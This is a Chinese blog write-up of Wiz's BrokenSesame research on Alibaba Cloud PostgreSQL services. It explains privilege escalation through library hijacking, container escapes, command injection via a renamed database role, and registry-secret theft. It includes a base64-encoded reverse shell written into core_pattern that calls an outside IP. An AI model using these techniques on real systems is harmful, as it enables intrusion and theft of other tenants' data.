---
title: 阿里云 BrokenSesame RCE 漏洞分析
date: 2023-05-12 20:10:00
updated: 2023-05-12 20:10:00
tags: security
description: 涉及一系列云原生安全相关漏洞利用方法，非常有意思
category: Cloud
---

> Wiz团队发表的漏洞分析文章 : https://www.wiz.io/blog/brokensesame-accidental-write-permissions-to-private-registry-allowed-potential-r
> 有很多巧妙的利用思路可以学习

Wiz Research在文章中披露了被命名为BrokenSesame的一系列阿里云数据库服务漏洞，会导致未授权访问阿里云客户的PostgreSQL数据库，并且可以通过在阿里巴巴的数据库服务上执行供应链攻击，从而完成RCE。

### AnalyticDB for PostgreSQL 容器逃逸漏洞

#### 容器提权

攻击向量从一个Postgres的普通用户开始，第一步文章作者通过定时任务提权到数据库容器的root权限。

容器内有一个每分钟执行`/usr/bin/tsar`的定时任务

```
$: ls -lah /etc/cron.d/tsar 
-rw-r--r-- 1 root root 99 Apr 19  2021 /etc/cron.d/tsar 

$: cat /etc/cron.d/tsar 

# cron tsar collect once per minute 
MAILTO="" 
* * * * * root /usr/bin/tsar --cron > /dev/null 2>&1
```

通过对该二进制文件执行`ldd`命令，可以看到它会从自定义的位置`/u01`加载共享库。而当前用户`adbpgadmin`对`/u01`目录具有写权限。

![img](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/1681856311-screenshot-2023-04-18-at-15-18-07.png)

```
$: ls -alh /u01/adbpg/lib/libgcc_s.so.1 
-rwxr-xr-x 1 adbpgadmin adbpgadmin 102K Oct 27 12:22 /u01/adbpg/lib/libgcc_s.so.1 
```

可以通过对此共享库文件的覆盖，来让下次定时任务执行时，以`root`身份执行这个二进制文件。

1. 编译共享库，将`/bin/bash`复制到`/bin/dash`，并且将其设置为`SUID`，来让我们以`root`身份执行代码。
2. 使用`PatchELF`向`libgcc_s.so.1`添加依赖，让加载`libgcc_s.so.1`时，能够加载我们自己编译的库。
3. 覆盖`libgcc_s.so.1`
4. 等待`/usr/bin/tsar`被执行

获取到`root`权限

![](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/1681856344-screenshot-2023-04-18-at-15-18-50.png)

#### 容器逃逸

拿到数据库容器`root`权限后，文章作者通过阿里云站点的开启`SSL`加密功能，发现会创建`SCP`和`SSH`等进程，并且利用进程完成了容器逃逸至宿主机（K8s node）。

开启`SSL`加密时，会产生进程的证明

```
# Command lines of the spawned processes
su - adbpgadmin -c scp /home/adbpgadmin/xxx_ssl_files/* 
*REDACTED*:/home/adbpgadmin/data/master/seg-1/ 

/usr/bin/ssh -x -oForwardAgent=no -oPermitLocalCommand=no -oClearAllForwardings=yes 
-- *REDACTED* scp -d -t /home/adbpgadmin/data/master/seg-1/ 
```

文章作者发现，这些进程在命令行中包含了容器不存在的路径，因此推断这些进程是在和数据库容器共享`PID namespace`的容器中生成的。

```
# The Python script we used to access the second container filesystem
import psutil 
import os 
listed = set() 
while True: 
    for proc in psutil.process_iter(): 
        try: 
            processName = proc.name() 
            processID = proc.pid 
            cmdLine = proc.cmdline() 
            if processID not in listed and processName == 'scp': 
                os.system('ls -alh /proc/{}/root/'.format(processID)) 

                listed.add(processID) 
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
          pass 
```

根据推测作者编写了这个`Python`脚本，先等待`SCP`进程生成，由于`SCP`进程会以当前数据库用户`adbpgadmin`u运行，因此进程生成后，可以通过`/proc/{pid}/root/`访问其文件系统。通过访问文件系统，发现`SCP`进程确实在第二个容器中运行，并且发现，两个容器都挂载了相同的`home`目录`/home/adbpgadmin`。

因为共享了`/home/adbpgadmin`，并且每次重新启用`SSL`都会执行`SSH`命令，可以通过修改本地`SSH`配置文件`/home/adbpgadmin/.ssh/config`的`LocalCommand`字段，来在第二个容器中，执行任意命令。

![img](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/1681857662-screenshot-2023-04-18-at-15-40-42.png)

接下来就可以通过将`SUID`复制到共享目录下，来让我们能够在第二个容器提权到`root`。

![img](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/1681857693-screenshot-2023-04-18-at-15-41-19.png)

在第二个容器中，发现此容器是特权容器，除此之外容器也可以访问`Docker Unix Socket`(`/run/docker.sock`)。由于第二个容器是临时创建，用于启动`SSL`加密的，存活时间较短，可以用 `Docker Unix Socket`来运行一个持久的特权容器。这个容器和宿主机（K8s node）具有相同的`PID`，`IPC`，`UST`，`NET`，`USER`和`MOUNT`命名空间，宿主机的根目录挂载在`/mnt`。这个容器会一直存在，并且通过`/home/adbpgadmin`的共享管道接收来自数据库容器的命令。

因为共享了网络命令空间，新生成的容器可以逃逸到宿主机（K8s node），并且能够访问`K8s API`。并且能够避免共享命名管道，在允许出网的情况下完成反弹Shell。

```
# Code execution inside the new privileged container 
$: echo ‘id’ > /home/adbpgadmin/i_pipe; timeout 1 cat /home/adbpgadmin/o_pipe 
uid=0(root) gid=0(root) groups=10(wheel) 

# Accessing the host filesystem from the new privileged container
$: echo ‘ls -alh /mnt’ > /home/adbpgadmin/i_pipe; timeout 2 cat /home/adbpgadmin/o_pipe 
total 88 
dr-xr-xr-x   23 root     root        4.0K Nov  6 10:07 . 
drwxr-xr-x    1 root     root        4.0K Nov  7 15:54 .. 
drwxr-x---    4 root     root        4.0K Nov  6 10:07 .kube 
lrwxrwxrwx    1 root     root           7 Aug 29  2019 bin -> usr/bin 
dr-xr-xr-x    5 root     root        4.0K Nov  2 10:21 boot 
drwxr-xr-x   17 root     root        3.1K Nov  6 10:08 dev 
drwxr-xr-x   84 root     root        4.0K Nov  6 10:08 etc 
drwxr-xr-x    3 root     root        4.0K Nov  2 10:24 flash 
drwxr-xr-x    6 root     root        4.0K Nov  6 10:11 home 
drwxr-xr-x    2 root     root        4.0K Nov  2 10:24 lafite 
lrwxrwxrwx    1 root     root           7 Aug 29  2019 lib -> usr/lib 
lrwxrwxrwx    1 root     root           9 Aug 29  2019 lib64 -> usr/lib64 
drwx------    2 root     root       16.0K Aug 29  2019 lost+found 
drwxr-xr-x    2 root     root        4.0K Dec  7  2018 media 
drwxr-xr-x    3 root     root        4.0K Nov  6 10:07 mnt 
drwxr-xr-x   11 root     root        4.0K Nov  6 10:07 opt 
dr-xr-xr-x  184 root     root           0 Nov  6 10:06 proc 
dr-xr-x---   10 root     root        4.0K Nov  6 10:07 root 
```

#### 供应链攻击

控制宿主机（K8s Node）后，存在权限配置问题，可以通过对注册表进行写，覆盖其他用户的容器/镜像，完成供应链攻击。

首先可以利用`kubelet`来检查各种集群资源，包括`secrets`，`pods`以及账户。在`Pod`列表中发现了同一集群下，属于其他用户的`Pod`列表。

```
# Listing the pods inside the K8s cluster
$: /tmp/kubectl get pods 
NAME                                                                       READY   STATUS      RESTARTS   AGE 
gp-4xo3*REDACTED*-master-100333536                                      1/1     Running     0          5d1h 
gp-4xo3*REDACTED*-master-100333537                                      1/1     Running     0          5d1h 
gp-4xo3*REDACTED*-segment-100333538                                     1/1     Running     0          5d1h 
gp-4xo3*REDACTED*-segment-100333539                                     1/1     Running     0          5d1h 
gp-4xo3*REDACTED*-segment-100333540                                     1/1     Running     0          5d1h 
gp-4xo3*REDACTED*-segment-100333541                                     1/1     Running     0          5d1h 
gp-gw87*REDACTED*-master-100292154                                      1/1     Running     0          175d 
gp-gw87*REDACTED*-master-100292155                                      1/1     Running     0          175d 
gp-gw87*REDACTED*-segment-100292156                                     1/1     Running     0          175d 
gp-gw87*REDACTED*-segment-100292157                                     1/1     Running     0          175d 
gp-gw87*REDACTED*-segment-100292158                                     1/1     Running     0          175d 
gp-gw87*REDACTED*-segment-100292159                                     1/1     Running     0          175d 
... 
```

并且因为阿里云使用私有仓库管理K8s容器镜像，而私有容器仓库的凭证在配置文件的`imagePullSecrets`。

```
# A snippet of the pods configuration, illustrating the use of a private container registry 

"spec": { 
    "containers": [ 
        { 
            "image": "*REDACTED*.eu-central-1.aliyuncs.com/apsaradb_*REDACTED*/*REDACTED*", 
            "imagePullPolicy": "IfNotPresent", 
...            
    "imagePullSecrets": [ 
        { 
            "name": "docker-image-secret" 
        } 
    ], 
```

```
# Retrieving the container registry secret
$: /tmp/kubectl get secret -o json docker-image-secret 
{ 
    "apiVersion": "v1", 
    "data": { 
        ".dockerconfigjson": "eyJhdXRoc*REDACTED*" 
    }, 
    "kind": "Secret", 
    "metadata": { 
        "creationTimestamp": "2020-11-12T14:57:36Z", 
        "name": "docker-image-secret", 
        "namespace": "default", 
        "resourceVersion": "2705", 
        "selfLink": "/api/v1/namespaces/default/secrets/docker-image-secret", 
        "uid": "6cb90d8b-1557-467a-b398-ab988db27908" 
    }, 
    "type": "kubernetes.io/dockerconfigjson" 
} 

# Redacted decoded credentials
{ 
    "auths": { 
        "registry-vpc.eu-central-1.aliyuncs.com": { 
            "auth": "*REDACTED*", 
            "password": "*REDACTED*", 
            "username": "apsaradb*REDACTED*" 
        } 
    } 
} 
```

使用拿到的`imagePullSecret`对容器镜像仓库进行测试，发现不仅具有拉取权限，还具有写权限，可以覆盖容器镜像，那么就有了对其他K8s Node的镜像进行供应链攻击的能力。

#### 环境风险

在具备一定的权限后，节点的环境例如`.bash_history`等文件中都存在`access keys`，`private keys`泄漏的可能，作者在对节点的扫描中发现了多个密钥。

### ApsaraDB RDS for PostgreSQL

#### 文件泄漏

`ApsaraDB RDS`容器的环境和`AnalyticDB`的容器不一样，没有定时任务来提权，因此作者找到了另一个提权方法。

在`/tmp/tools_log`目录下发现了`docker_tools.log`文件

```
$: ls -alh /tmp/tools_log 
total 2.4M 
drwxrwxrwx 2 root root 4.0K Nov 10 08:55 . 
drwxrwxrwx 5 root root 4.0K Nov 16 23:07 .. 
-rwxrwxrwx 1 root root 2.4M Nov 16 23:07 docker_tools.log
```

这个文件是另一个容器的操作日志，这个容器是负责在用户使用的数据库容器上执行某些操作的。并且发现，可以在阿里云服务的站点，使用撤销文件配置，会触发日志。

![img](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/1681852810-screenshot-2023-04-18-at-14-19-19.png)

红色部分的`sed`命令是在另一个容器中执行的，会对两个容器共享的目录`/data/pg_hba.conf`进行修改。`sed -i`会先将目标文件复制到临时位置，用正则进行修改后，移回原来的位置。利用这个特性，可以通过符号链接来从第二个容器中复制文件。

通过此命令创建一个指向`k8x_ctx.py`的符号链接

```
$: unlink pg_hba.conf; ln -s *REDACTED*/operator/k8s_ctx.py pg_hba.conf 
```

接着在阿里云的站带你点击撤销列表，`pg_hba.conf`就会发生变化，并且看到在第二个容器中文件的内容。

```
# Reading a file from the second container
$: cat pg_hba.conf  
import os 
import pwd 
from *REDACTED*/operator.utils.envs import ToolImageEnv 
from *REDACTED*/operator.k8s_ctx import db_ctx_pgsql_config, db_ctx_pgsql_database, db_ctx_pgsql_replica, \ 
    db_ctx_pgsql_system, db_ctx_pgsql_switch 
… 
```

重复操作可以获得在第二个容器中运行的完整Python代码。

从代码中可以发现，几乎任何针对用户数据库的管理操作，都会创建一个具有相同代码的新容器，并且根据传递的环境变量，执行对应的的具体操作。

#### 容器逃逸

阿里云提供了一个验证PostgreSQL是否可以正常升级的功能，来帮助用户避免数据库损坏。对这个功能，文章作者发现了存在命令注入漏洞，可以在负责此操作的容器中执行任意代码。

![img](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/1681853224-upgrade_check.png)

![img](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/1681854088-screenshot-2023-04-18-at-14-34-31.png)

在代码中，`install_user`参数被格式化为一个命令行并且没有做过滤就使用`root`权限执行命令，而`install_user`恰好是可以控制的，通过以下查询从数据库中获取。

```
select rolname from pg_authid where oid=10; 
```

这个查询返回的是`PostgreSql`的超级用户的用户名。

阿里云使用`alicloud_rds_admin`作为该服务的超级用户，因此就能利用如下的操作，在新生成而用于版本升级检测的容器中完成RCE。

1. 通过阿里云的站点，启动数据库升级检测
2. 使用ALTER ROLE "alicloud_rds_admin" RENAME TO "\`id\`";将`alicloud_rds_admin`用户名改为命令行注入。
3. 等待5秒让进程节航速
4. 恢复用户名

至此就能拿到一个特权容器的root权限

接下来使用`core_pattern`来进行容器逃逸

1. 需要`/proc/sys`以可写模式挂载，用于可以覆盖`proc/sys/kernel/core_pattern`
2. `/porc/sys/kernel/core_pattern`的语法允许通过`|`将内容传输到程序。由于`core_pattern`和主机共享，在发生`crash`时会在主机上执行，最终完成容器逃逸。

恰好条件符合，这里用base64编码了一个反弹shell命令，覆盖了`proc/sys/kernel/core_pattern`文件

```
echo '|/bin/bash -c 
echo${IFS%%??}L2Jpbi9iYXNoIC1pPiYvZGV2L3RjcC8yMC4xMjQuMTk0LjIxMi82MDAwMSAwPiYxCg==|base64${
IFS%%??}-d|/bin/bash' > /proc/sys/kernel/core_pattern 
```

回到PostgreSql容器，终止进程。

```
$: sh -c 'kill -11 "$$"' 
```

成功拿到宿主机（K8s Node）的Shell

```
[root@i-gw80v6j*REDACTED* /] 

$: id 
uid=0(root) gid=0(root) groups=0(root) 
```

#### 横向移动

和`AnalyticDB`一样，可以利用`kubelet`来查看集群信息。

可以查看`pod`列表，并且能够查看在一个节点上其他用户的数据库信息。

```
# Other customers’ data mounted on our node
$: mount | grep -i /mount | grep -ioE 'pgm-(.*?)/' | sort | uniq 
pgm-*REDACTED*-data-19d1322c/ 
pgm-*REDACTED*-data-15c361da/ 
pgm-*REDACTED*-data-38f60684/ 
pgm-*REDACTED*-data-61b4d30a/ 
pgm-*REDACTED*-data-0197fb99/ 
pgm-*REDACTED*-data-0fa7676b/ 
pgm-*REDACTED*-data-52250988/ 
pgm-*REDACTED*-data-8d044ffb/ 
pgm-*REDACTED*-data-09290508/ 
pgm-*REDACTED*-data-bc610a92/ 
pgm-*REDACTED*-data-d386ec2d/ 
pgm-*REDACTED*-data-ed5993d7/ 
pgm-*REDACTED*-data-a554506c/ 
pgm-*REDACTED*-data-d99da2be/ 
```

